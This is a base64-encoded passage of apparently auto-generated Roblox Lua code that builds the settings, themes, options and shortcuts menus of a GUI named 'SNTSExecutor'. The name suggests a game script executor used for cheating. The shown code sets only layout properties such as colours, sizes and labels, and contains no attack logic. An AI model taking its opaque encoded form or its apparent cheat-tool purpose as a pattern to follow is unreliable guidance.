kcyTFsiYzciXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDM1LCAwLCAzNSk7CkcyTFsiYzciXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjI5NDc4LCAwLCAwLjM0LCAwKTsKRzJMWyJjNyJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbImM3Il1bIk5hbWUiXSA9IFtbR3JhZGllbnQxXV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lNS5UaGVtZTUuR3JhZGllbnQxLlVJQ29ybmVyCkcyTFsiYzgiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbImM3Il0pOwpHMkxbImM4Il1bIkNvcm5lclJhZGl1cyJdID0gVURpbS5uZXcoMCwgMTAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWU1LlRoZW1lNS5HcmFkaWVudDEuVUlTdHJva2UKRzJMWyJjOSJdID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIsIEcyTFsiYzciXSk7CkcyTFsiYzkiXVsiVGhpY2tuZXNzIl0gPSAyOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTUuVGhlbWU1LkdyYWRpZW50MgpHMkxbImNhIl0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyJjNiJdKTsKRzJMWyJjYSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiY2EiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiY2EiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDEsIDAuNSk7CkcyTFsiY2EiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDM1LCAwLCAzNSk7CkcyTFsiY2EiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjYzMDYsIDAsIDAuMzQsIDApOwpHMkxbImNhIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiY2EiXVsiTmFtZSJdID0gW1tHcmFkaWVudDJdXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWU1LlRoZW1lNS5HcmFkaWVudDIuVUlDb3JuZXIKRzJMWyJjYiJdID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIEcyTFsiY2EiXSk7CkcyTFsiY2IiXVsiQ29ybmVyUmFkaXVzIl0gPSBVRGltLm5ldygwLCAxMDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTUuVGhlbWU1LkdyYWRpZW50Mi5VSVN0cm9rZQpHMkxbImNjIl0gPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIiwgRzJMWyJjYSJdKTsKRzJMWyJjYyJdWyJUaGlja25lc3MiXSA9IDI7CkcyTFsiY2MiXVsiQ29sb3IiXSA9IENvbG9yMy5mcm9tUkdCKDIwMSwgMjAxLCAyMDEpOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlRoZW1lcy5TY3JvbGxpbmdGcmFtZS5UaGVtZTUuVGhlbWU1LkdyYWRpZW50MwpHMkxbImNkIl0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyJjNiJdKTsKRzJMWyJjZCJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiY2QiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiY2QiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDEsIDAuNSk7CkcyTFsiY2QiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDM1LCAwLCAzNSk7CkcyTFsiY2QiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjk2NjQyLCAwLCAwLjM0LCAwKTsKRzJMWyJjZCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbImNkIl1bIk5hbWUiXSA9IFtbR3JhZGllbnQzXV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlNjcm9sbGluZ0ZyYW1lLlRoZW1lNS5UaGVtZTUuR3JhZGllbnQzLlVJQ29ybmVyCkcyTFsiY2UiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbImNkIl0pOwpHMkxbImNlIl1bIkNvcm5lclJhZGl1cyJdID0gVURpbS5uZXcoMCwgMTAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWU1LlRoZW1lNS5HcmFkaWVudDMuVUlTdHJva2UKRzJMWyJjZiJdID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIsIEcyTFsiY2QiXSk7CkcyTFsiY2YiXVsiVGhpY2tuZXNzIl0gPSAyOwpHMkxbImNmIl1bIkNvbG9yIl0gPSBDb2xvcjMuZnJvbVJHQigyMDEsIDIwMSwgMjAxKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWU1LlRoZW1lNS5HcmFkaWVudDMuVUlHcmFkaWVudApHMkxbImQwIl0gPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiLCBHMkxbImNkIl0pOwpHMkxbImQwIl1bIkNvbG9yIl0gPSBDb2xvclNlcXVlbmNlLm5ld3tDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMDAwLCBDb2xvcjMuZnJvbVJHQigxNTMsIDcyLCAxOTYpKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNDcxLCBDb2xvcjMuZnJvbVJHQigxMzYsIDcxLCAyMjApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEuMDAwLCBDb2xvcjMuZnJvbVJHQig5MSwgNzksIDIwMykpfTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuU2Nyb2xsaW5nRnJhbWUuVGhlbWU1LlRoZW1lNS5VSUdyaWRMYXlvdXQKRzJMWyJkMSJdID0gSW5zdGFuY2UubmV3KCJVSUdyaWRMYXlvdXQiLCBHMkxbImM2Il0pOwpHMkxbImQxIl1bIkhvcml6b250YWxBbGlnbm1lbnQiXSA9IEVudW0uSG9yaXpvbnRhbEFsaWdubWVudC5DZW50ZXI7CkcyTFsiZDEiXVsiQ2VsbFNpemUiXSA9IFVEaW0yLm5ldygwLCAzNSwgMCwgMzUpOwpHMkxbImQxIl1bIlZlcnRpY2FsQWxpZ25tZW50Il0gPSBFbnVtLlZlcnRpY2FsQWxpZ25tZW50LkNlbnRlcjsKRzJMWyJkMSJdWyJTb3J0T3JkZXIiXSA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyOwpHMkxbImQxIl1bIkNlbGxQYWRkaW5nIl0gPSBVRGltMi5uZXcoMCwgMTAsIDAsIDApOwpHMkxbImQxIl1bIkZpbGxEaXJlY3Rpb24iXSA9IEVudW0uRmlsbERpcmVjdGlvbi5WZXJ0aWNhbDsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5UaGVtZXMuVUlBc3BlY3RSYXRpb0NvbnN0cmFpbnQKRzJMWyJkMiJdID0gSW5zdGFuY2UubmV3KCJVSUFzcGVjdFJhdGlvQ29uc3RyYWludCIsIEcyTFsiODIiXSk7CkcyTFsiZDIiXVsiQXNwZWN0UmF0aW8iXSA9IDAuNzU2NjU7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuVGhlbWVzLlVJU2NhbGUKRzJMWyJkMyJdID0gSW5zdGFuY2UubmV3KCJVSVNjYWxlIiwgRzJMWyI4MiJdKTsKCi0tIEF0dHJpYnV0ZXMKRzJMWyJkMyJdOlNldEF0dHJpYnV0ZShbW1Jlc29sdXRpb25dXSwgVmVjdG9yMi5uZXcoMTkxOSwgMTA4MCkpOwoKLS0gVGFncwpDb2xsZWN0aW9uU2VydmljZTpBZGRUYWcoRzJMWyJkMyJdLCBbW1VJU2NhbGVSdW50aW1lT2JqZWN0XV0pOwoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuT3B0aW9ucwpHMkxbImQ0Il0gPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiLCBHMkxbIjgxIl0pOwpHMkxbImQ0Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJkNCJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyJkNCJdWyJJbWFnZSJdID0gW1tyYnhhc3NldGlkOi8vMTEwMzc2MzMxMDIwNTI0XV07CkcyTFsiZDQiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDM3MCwgMCwgMjAwKTsKRzJMWyJkNCJdWyJWaXNpYmxlIl0gPSBmYWxzZTsKRzJMWyJkNCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbImQ0Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiZDQiXVsiTmFtZSJdID0gW1tPcHRpb25zXV07CkcyTFsiZDQiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjAxMzQ1LCAwLCAwLjI4NTg5LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5PcHRpb25zLlVJR3JhZGllbnQKRzJMWyJkNSJdID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IiwgRzJMWyJkNCJdKTsKRzJMWyJkNSJdWyJSb3RhdGlvbiJdID0gLTkwOwpHMkxbImQ1Il1bIkNvbG9yIl0gPSBDb2xvclNlcXVlbmNlLm5ld3tDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMDAwLCBDb2xvcjMuZnJvbVJHQig1OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC4yNjEsIENvbG9yMy5mcm9tUkdCKDgwLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjYxOCwgQ29sb3IzLmZyb21SR0IoMTIwLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk4OCwgQ29sb3IzLmZyb21SR0IoMTcxLCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk5NywgQ29sb3IzLmZyb21SR0IoMTk4LCAwLCAwKSksQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLjAwMCwgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSl9OwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLk9wdGlvbnMuU2VydmVyVGV4dApHMkxbImQ2Il0gPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIEcyTFsiZDQiXSk7CkcyTFsiZDYiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImQ2Il1bIlRleHRTaXplIl0gPSAyNTsKRzJMWyJkNiJdWyJUZXh0WEFsaWdubWVudCJdID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwpHMkxbImQ2Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImQ2Il1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiZDYiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiZDYiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyJkNiJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCk7CkcyTFsiZDYiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJkNiJdWyJUZXh0Il0gPSBbW09wdGlvbnNdXTsKRzJMWyJkNiJdWyJOYW1lIl0gPSBbW1NlcnZlclRleHRdXTsKRzJMWyJkNiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMDk1NzEsIDAsIDAuMDI2MDUsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLk9wdGlvbnMuVGhlbWUxCkcyTFsiZDciXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbImQ0Il0pOwpHMkxbImQ3Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJkNyJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQig3NiwgODAsIDIwNik7CkcyTFsiZDciXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDI5MCwgMCwgNTYpOwpHMkxbImQ3Il1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4xMDgxMSwgMCwgMC4zMjUsIDApOwpHMkxbImQ3Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiZDciXVsiTmFtZSJdID0gW1tUaGVtZTFdXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5PcHRpb25zLlRoZW1lMS5VSUNvcm5lcgpHMkxbImQ4Il0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyJkNyJdKTsKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuT3B0aW9ucy5UaGVtZTEuVGhlbWUxCkcyTFsiZDkiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbImQ3Il0pOwpHMkxbImQ5Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJkOSJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigzNywgMzcsIDM3KTsKRzJMWyJkOSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMTM0LCAwLCA1MCk7CkcyTFsiZDkiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjQ5MzEsIDAsIDAuMjAwOTEsIDApOwpHMkxbImQ5Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiZDkiXVsiTmFtZSJdID0gW1tUaGVtZTFdXTsKRzJMWyJkOSJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLk9wdGlvbnMuVGhlbWUxLlRoZW1lMS5VSUdyaWRMYXlvdXQKRzJMWyJkYSJdID0gSW5zdGFuY2UubmV3KCJVSUdyaWRMYXlvdXQiLCBHMkxbImQ5Il0pOwpHMkxbImRhIl1bIkhvcml6b250YWxBbGlnbm1lbnQiXSA9IEVudW0uSG9yaXpvbnRhbEFsaWdubWVudC5DZW50ZXI7CkcyTFsiZGEiXVsiQ2VsbFNpemUiXSA9IFVEaW0yLm5ldygwLCAzNSwgMCwgMzUpOwpHMkxbImRhIl1bIlZlcnRpY2FsQWxpZ25tZW50Il0gPSBFbnVtLlZlcnRpY2FsQWxpZ25tZW50LkNlbnRlcjsKRzJMWyJkYSJdWyJTb3J0T3JkZXIiXSA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyOwpHMkxbImRhIl1bIkNlbGxQYWRkaW5nIl0gPSBVRGltMi5uZXcoMCwgMTAsIDAsIDUpOwpHMkxbImRhIl1bIkZpbGxEaXJlY3Rpb24iXSA9IEVudW0uRmlsbERpcmVjdGlvbi5WZXJ0aWNhbDsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5PcHRpb25zLlVJQXNwZWN0UmF0aW9Db25zdHJhaW50CkcyTFsiZGIiXSA9IEluc3RhbmNlLm5ldygiVUlBc3BlY3RSYXRpb0NvbnN0cmFpbnQiLCBHMkxbImQ0Il0pOwpHMkxbImRiIl1bIkFzcGVjdFJhdGlvIl0gPSAxLjg1OwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLk9wdGlvbnMuVUlTY2FsZQpHMkxbImRjIl0gPSBJbnN0YW5jZS5uZXcoIlVJU2NhbGUiLCBHMkxbImQ0Il0pOwoKLS0gQXR0cmlidXRlcwpHMkxbImRjIl06U2V0QXR0cmlidXRlKFtbUmVzb2x1dGlvbl1dLCBWZWN0b3IyLm5ldygxOTE5LCAxMDgwKSk7CgotLSBUYWdzCkNvbGxlY3Rpb25TZXJ2aWNlOkFkZFRhZyhHMkxbImRjIl0sIFtbVUlTY2FsZVJ1bnRpbWVPYmplY3RdXSk7CgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5TaG9ydGN1dHMKRzJMWyJkZCJdID0gSW5zdGFuY2UubmV3KCJJbWFnZUxhYmVsIiwgRzJMWyI4MSJdKTsKRzJMWyJkZCJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiZGQiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiZGQiXVsiSW1hZ2UiXSA9IFtbcmJ4YXNzZXRpZDovLzc5NzU4MTc5Nzg3MzI1XV07CkcyTFsiZGQiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDM3MCwgMCwgNDg5KTsKRzJMWyJkZCJdWyJWaXNpYmxlIl0gPSBmYWxzZTsKRzJMWyJkZCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbImRkIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiZGQiXVsiTmFtZSJdID0gW1tTaG9ydGN1dHNdXTsKRzJMWyJkZCJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMDEzNDUsIDAsIDAuNDYzMjcsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlNob3J0Y3V0cy5EaXNwbGF5TmFtZQpHMkxbImRlIl0gPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIEcyTFsiZGQiXSk7CkcyTFsiZGUiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImRlIl1bIlRleHRTaXplIl0gPSAyNTsKRzJMWyJkZSJdWyJUZXh0WEFsaWdubWVudCJdID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwpHMkxbImRlIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImRlIl1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiZGUiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiZGUiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyJkZSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCk7CkcyTFsiZGUiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJkZSJdWyJUZXh0Il0gPSBbW1Nob3J0Y3V0c11dOwpHMkxbImRlIl1bIk5hbWUiXSA9IFtbRGlzcGxheU5hbWVdXTsKRzJMWyJkZSJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMDk1NzEsIDAsIDAuMDE3NzYsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlNob3J0Y3V0cy5VSUdyYWRpZW50CkcyTFsiZGYiXSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIEcyTFsiZGQiXSk7CkcyTFsiZGYiXVsiUm90YXRpb24iXSA9IC05MDsKRzJMWyJkZiJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNTgsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMjYxLCBDb2xvcjMuZnJvbVJHQig4MCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC42MTgsIENvbG9yMy5mcm9tUkdCKDEyMCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45OTcsIENvbG9yMy5mcm9tUkdCKDE5OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkpfTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5TaG9ydGN1dHMuU2Nyb2xsaW5nRnJhbWUKRzJMWyJlMCJdID0gSW5zdGFuY2UubmV3KCJTY3JvbGxpbmdGcmFtZSIsIEcyTFsiZGQiXSk7CkcyTFsiZTAiXVsiQWN0aXZlIl0gPSB0cnVlOwpHMkxbImUwIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJlMCJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyJlMCJdWyJTY3JvbGxCYXJJbWFnZVRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyJlMCJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMzAxLCAwLCAzNDUpOwpHMkxbImUwIl1bIlNjcm9sbEJhckltYWdlQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNDEsIDI0MSwgMjQxKTsKRzJMWyJlMCJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMDkxODksIDAsIDAuMTczODIsIDApOwpHMkxbImUwIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiZTAiXVsiU2Nyb2xsQmFyVGhpY2tuZXNzIl0gPSA1OwpHMkxbImUwIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuU2hvcnRjdXRzLlNjcm9sbGluZ0ZyYW1lLlNob3J0Y3V0MQpHMkxbImUxIl0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyJlMCJdKTsKRzJMWyJlMSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiZTEiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMzcsIDM3LCAzNyk7CkcyTFsiZTEiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDI5MCwgMCwgNzUpOwpHMkxbImUxIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiZTEiXVsiTmFtZSJdID0gW1tTaG9ydGN1dDFdXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5TaG9ydGN1dHMuU2Nyb2xsaW5nRnJhbWUuU2hvcnRjdXQxLlVJQ29ybmVyCkcyTFsiZTIiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbImUxIl0pOwoKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5TaG9ydGN1dHMuU2Nyb2xsaW5nRnJhbWUuU2hvcnRjdXQxLkRpdmlkZXIKRzJMWyJlMyJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiZTEiXSk7CkcyTFsiZTMiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImUzIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImUzIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDAuNSk7CkcyTFsiZTMiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDEsIDAsIDMzKTsKRzJMWyJlMyJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKTsKRzJMWyJlMyJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbImUzIl1bIk5hbWUiXSA9IFtbRGl2aWRlcl1dOwpHMkxbImUzIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDAuNzsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5TaG9ydGN1dHMuU2Nyb2xsaW5nRnJhbWUuU2hvcnRjdXQxLlNob3J0Y3V0MQpHMkxbImU0Il0gPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIEcyTFsiZTEiXSk7CkcyTFsiZTQiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImU0Il1bIlRleHRTaXplIl0gPSAxNzsKRzJMWyJlNCJdWyJUZXh0WEFsaWdubWVudCJdID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwpHMkxbImU0Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImU0Il1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiZTQiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoODYsIDg2LCA4Nik7CkcyTFsiZTQiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyJlNCJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMCwgMC41KTsKRzJMWyJlNCJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMTg1LCAwLCA1MCk7CkcyTFsiZTQiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJlNCJdWyJUZXh0Il0gPSBbW1RvZ2dsZSBHdWldXTsKRzJMWyJlNCJdWyJOYW1lIl0gPSBbW1Nob3J0Y3V0MV1dOwpHMkxbImU0Il1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4wNDY3OCwgMCwgMC41LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5TaG9ydGN1dHMuU2Nyb2xsaW5nRnJhbWUuU2hvcnRjdXQxLktleWJpbmQxCkcyTFsiZTUiXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyJlMSJdKTsKRzJMWyJlNSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiZTUiXVsiVGV4dFNpemUiXSA9IDE3OwpHMkxbImU1Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImU1Il1bIkZvbnRGYWNlIl0gPSBGb250Lm5ld